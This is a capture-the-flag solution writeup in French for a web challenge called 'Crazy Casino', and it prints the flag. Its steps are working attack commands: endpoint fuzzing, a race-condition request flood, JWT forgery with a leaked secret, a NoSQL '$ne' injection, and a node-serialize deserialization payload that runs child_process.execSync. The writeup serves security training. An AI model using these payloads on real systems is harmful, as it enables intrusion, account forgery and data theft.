# Crazy Casino - Solution Writeup (INSANE)

## Flag
`NHK26{r4c3_c0nd1t10n_b34ts_th3_h0us3!!}`

---

## Etape 0: Reconnaissance (OBLIGATOIRE)

### Enumeration des endpoints
```bash
# Fuzzing requis - aucun endpoint documente
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://TARGET -w /usr/share/wordlists/common.txt

# Decouvrir robots.txt
curl http://TARGET/robots.txt
# Revele: /backup/, /api/internal/
```

### Decouverte du secret JWT (puzzle en 2 parties)
```bash
# 1. Backup file
curl http://TARGET/backup/config.bak
# Output: JWT_KEY_PART1=casino_secr

# 2. Analyser le JS frontend pour trouver l'indice du header x-debug-mode
# Dans /static/js/config.js: "Debug mode - set header x-debug-mode:true"

# 3. Endpoint debug avec le header
curl http://TARGET/api/internal/debug -H "x-debug-mode: true"
# Output: jwt_key_part2: "et_2026"

# SECRET COMPLET: casino_secret_2026
```

---

## Etape 1: Race Condition (Fragment 1)

### Decouverte
Fuzzer les endpoints API pour trouver `/api/g/play`

### Exploitation
```bash
TOKEN="<token_login>"

# Spam 50 requetes simultanees
for i in {1..50}; do
  curl -X POST http://TARGET/api/g/play \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"amt":100}' &
done
wait
```

### Resultat
Balance negative ou > 100000 → champ `f` contient `NHK26{r4c3_`

---

## Etape 2: JWT Forge (Fragment 2)

### Forger le token avec le secret trouve
```python
import jwt

token = jwt.encode({
    "sub": 1,
    "usr": "hacker",
    "bal": 9999999,    # balance >= 1000000
    "lvl": 3           # vip level >= 3
}, "casino_secret_2026", algorithm="HS256")
print(token)
```

### Verifier
```bash
curl http://TARGET/auth/me -H "Authorization: Bearer $FORGED"
# champ "msg" contient: c0nd1t10n_
```

---

## Etape 3: NoSQL Injection (Fragment 3)

### Decouverte
Fuzzer pour trouver `/api/m/q` (endpoint membres/VIP)

### Exploitation
```bash
curl -X POST http://TARGET/api/m/q \
  -H "Authorization: Bearer $FORGED" \
  -H "Content-Type: application/json" \
  -d '{"u": {"$ne": null}}'
```

### Resultat
Dump de tous les VIP → chercher `system_vault` → secret_note: `b34ts_th3_`

---

## Etape 4: Deserialization RCE (Fragment 4)

### Decouverte
Fuzzer pour trouver `/api/t/process`

### Payload node-serialize
```bash
curl -X POST http://TARGET/api/t/process \
  -H "Authorization: Bearer $FORGED" \
  -H "Content-Type: application/json" \
  -d '{"d": "{\"rce\":\"_$$ND_FUNC$$_function(){require('\\''child_process'\\'').execSync('\\''touch /tmp/pwned'\\'');}()\"}"}'
```

### Verifier RCE
```bash
curl http://TARGET/api/t/check -H "Authorization: Bearer $FORGED"
# champ "f" contient: h0us3!!}
```

---

## Flag Final

```
Fragment 1 (race): NHK26{r4c3_
Fragment 2 (jwt):  c0nd1t10n_
Fragment 3 (sqli): b34ts_th3_
Fragment 4 (rce):  h0us3!!}

FLAG: NHK26{r4c3_c0nd1t10n_b34ts_th3_h0us3!!}
```

---

## Pourquoi c'est INSANE

| Difficulte | Description |
|------------|-------------|
| Enumeration | Tous les endpoints doivent etre fuzzes |
| JWT Secret | En 2 parties, necessite header special |
| Endpoints | Obscurcis: `/api/g/`, `/api/m/`, `/api/t/` |
| Champs | Minifies: `sub`, `usr`, `bal`, `lvl`, `amt`, `d`, `u` |
| Erreurs | Generiques: "Forbidden", "Unauthorized", "Error" |
| Aucun hint | Pas d'indication sur les requirements |

## Temps estime: 5-8 heures
